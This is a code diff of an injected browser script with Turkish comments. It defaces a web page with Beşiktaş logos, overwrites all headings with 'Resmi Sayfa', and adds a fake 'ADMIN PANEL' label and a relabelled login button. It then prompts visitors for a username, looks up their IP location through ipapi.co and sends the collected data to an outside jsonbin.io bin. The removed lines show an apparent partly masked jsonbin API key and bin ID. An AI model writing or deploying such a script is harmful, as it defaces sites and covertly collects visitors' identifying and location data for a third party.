@@ -1,5 +1,4 @@
 (async () => {
-  // Temel stil ayarları
   const body = document.body;
   body.style.backgroundImage = "url('https://upload.wikimedia.org/wikipedia/tr/2/22/Besiktas_CJK.png')";
   body.style.backgroundSize = "cover";
@@ -11,7 +10,6 @@
   body.style.backgroundColor = '#000000';
   body.style.color = '#FFFFFF';
 
-  // Logo güncelleme
   const logo = document.querySelector('img');
   if (logo) {
     logo.src = 'https://upload.wikimedia.org/wikipedia/commons/2/20/Logo_of_Be%C5%9Fikta%C5%9F_JK.svg';
@@ -19,12 +17,8 @@
     logo.style.border = '3px solid white';
   }
 
-  // Başlıkları güncelle
-  document.querySelectorAll('h1,h2,h3,h4,h5').forEach(element => {
-    element.textContent = 'Resmi Sayfa';
-  });
+  document.querySelectorAll('h1,h2,h3,h4,h5').forEach(el => el.textContent = 'Resmi Sayfa');
 
-  // Giriş butonu düzenlemesi
   const loginButton = document.querySelector('button[type="submit"]');
   if (loginButton) {
     loginButton.textContent = 'Giriş Yap';
@@ -35,21 +29,22 @@
     loginButton.style.cursor = 'pointer';
   }
 
-  // Admin panel yazısı
   const adminPanelLabel = document.createElement('div');
   adminPanelLabel.textContent = "ADMIN PANEL";
-  adminPanelLabel.style.position = 'fixed';
-  adminPanelLabel.style.top = '50px';
-  adminPanelLabel.style.left = '50%';
-  adminPanelLabel.style.transform = 'translateX(-50%)';
-  adminPanelLabel.style.fontWeight = '700';
-  adminPanelLabel.style.fontSize = '22px';
-  adminPanelLabel.style.padding = '6px 15px';
-  adminPanelLabel.style.borderRadius = '12px';
-  adminPanelLabel.style.zIndex = '99999';
-  adminPanelLabel.style.userSelect = 'none';
-  adminPanelLabel.style.transition = "color 0.5s, background-color 0.5s";
-  adminPanelLabel.style.cursor = "default";
+  Object.assign(adminPanelLabel.style, {
+    position: 'fixed',
+    top: '50px',
+    left: '50%',
+    transform: 'translateX(-50%)',
+    fontWeight: '700',
+    fontSize: '22px',
+    padding: '6px 15px',
+    borderRadius: '12px',
+    zIndex: '99999',
+    userSelect: 'none',
+    transition: 'color 0.5s, background-color 0.5s',
+    cursor: 'default',
+  });
 
   function updateAdminPanelColors() {
     if (isDarkMode) {
@@ -65,10 +60,9 @@
   updateAdminPanelColors();
   document.body.appendChild(adminPanelLabel);
 
-  // Gece/gündüz modu değişimi
   setInterval(() => {
     isDarkMode = !isDarkMode;
-    if(isDarkMode){
+    if (isDarkMode) {
       body.style.backgroundColor = '#000000';
       body.style.color = '#FFFFFF';
     } else {
@@ -78,22 +72,21 @@
     updateAdminPanelColors();
   }, 20000);
 
-  // Kartal animasyonu (sadeleştirilebilir)
   function flyEagle() {
     const eagleAnimation = document.createElement('img');
     eagleAnimation.src = 'https://upload.wikimedia.org/wikipedia/commons/2/20/Logo_of_Be%C5%9Fikta%C5%9F_JK.svg';
-    eagleAnimation.style.position = 'fixed';
-    eagleAnimation.style.top = '50%';
-    eagleAnimation.style.left = '-200px';
-    eagleAnimation.style.width = '100px';
-    eagleAnimation.style.transition = 'left 5s linear';
-    eagleAnimation.style.zIndex = '9999';
+    Object.assign(eagleAnimation.style, {
+      position: 'fixed',
+      top: '50%',
+      left: '-200px',
+      width: '100px',
+      transition: 'left 5s linear',
+      zIndex: '9999',
+    });
     document.body.appendChild(eagleAnimation);
-
     setTimeout(() => {
       eagleAnimation.style.left = '110%';
     }, 100);
-
     setTimeout(() => {
       document.body.removeChild(eagleAnimation);
     }, 5100);
@@ -101,7 +94,6 @@
   setInterval(flyEagle, 30000);
   flyEagle();
 
-  // Skor takibi (örnek amaçlı)
   function displayScore() {
     const score = Math.floor(Math.random() * 100);
     let highestScore = localStorage.getItem('highestScore') || 0;
@@ -114,7 +106,6 @@
   }
   displayScore();
 
-  // Kullanıcıdan isim alma
   const userName = prompt("Lütfen kullanıcı adınızı giriniz:");
   if (userName) {
     const welcomeMessage = document.createElement('h2');
@@ -125,7 +116,6 @@
     document.body.prepend(welcomeMessage);
   }
 
-  // IP konum alma fonksiyonu
   async function getIpLocation() {
     try {
       const response = await fetch('https://ipapi.co/json/');
@@ -138,7 +128,6 @@
   }
   const locationData = await getIpLocation();
 
-  // Veri toplama fonksiyonu
   function collectData() {
     return {
       userName: userName || null,
@@ -164,12 +153,21 @@
     };
   }
 
-  // --- JSONBIN.IO ENTEGRASYONU ---
+  const apiKey = 'BURAYA_API_KEYİNİ_YAZ';  // jsonbin.io API Key
+  const binId = 'BURAYA_BIN_ID_YAZ';       // jsonbin.io Bin ID
 
-  const apiKey = '$2a$10$WyBCjBNDWR47OqW/NsfqL...udbAialXkiuFTkWYLM7qQWa7G/A6m';  // Buraya jsonbin.io API Key
-  const binId = '6874d568355eab5e8b1b13a3';        // Buraya jsonbin.io Bin ID
+  async function getDataFromJsonBin() {
+    const res = await fetch(`https://api.jsonbin.io/v3/b/${binId}/latest`, {
+      headers: { 'X-Master-Key': apiKey }
+    });
+    if (!res.ok) {
+      console.error('Veri alma başarısız:', res.statusText);
+      return null;
+    }
+    const json = await res.json();
+    return json.record;
+  }
 
-  // Veri gönderme
   async function sendDataToJsonBin(data) {
     const res = await fetch(`https://api.jsonbin.io/v3/b/${binId}`, {
       method: 'PUT',
@@ -179,7 +177,6 @@
       },
       body: JSON.stringify(data)
     });
-
     if (!res.ok) {
       console.error('Veri gönderme başarısız:', res.statusText);
     } else {
@@ -187,29 +184,27 @@
     }
   }
 
-  // Veri alma
-  async function getDataFromJsonBin() {
-    const res = await fetch(`https://api.jsonbin.io/v3/b/${binId}/latest`, {
-      headers: {
-        'X-Master-Key': apiKey
-      }
-    });
-
-    if (!res.ok) {
-      console.error('Veri alma başarısız:', res.statusText);
-      return null;
+  async function updateBinWithNewData(newData) {
+    const currentData = await getDataFromJsonBin() || {};
+    // Eğer mevcut data dizi ise yeni veriyi diziye ekle, değilse objeyi güncelle
+    let updatedData;
+    if (Array.isArray(currentData)) {
+      updatedData = [...currentData, newData];
+    } else if (typeof currentData === 'object' && currentData !== null) {
+      updatedData = { ...currentData, ...newData };
+    } else {
+      updatedData = newData;
     }
-
-    const json = await res.json();
-    return json.record;
+    await sendDataToJsonBin(updatedData);
   }
 
-  // Veri toplama ve gönderme işlemi
   const dataToSend = collectData();
-  await sendDataToJsonBin(dataToSend);
+  await updateBinWithNewData(dataToSend);
 
-  // Veri alma ve konsola yazdırma
-  const receivedData = await getDataFromJsonBin();
-  console.log('Jsonbin’den alınan veri:', receivedData);
+  // Küçük bekleme koy, sonra veriyi çek ve göster
+  setTimeout(async () => {
+    const receivedData = await getDataFromJsonBin();
+    console.log('Jsonbin’den alınan veri:', receivedData);
+  }, 500);
 
 })();
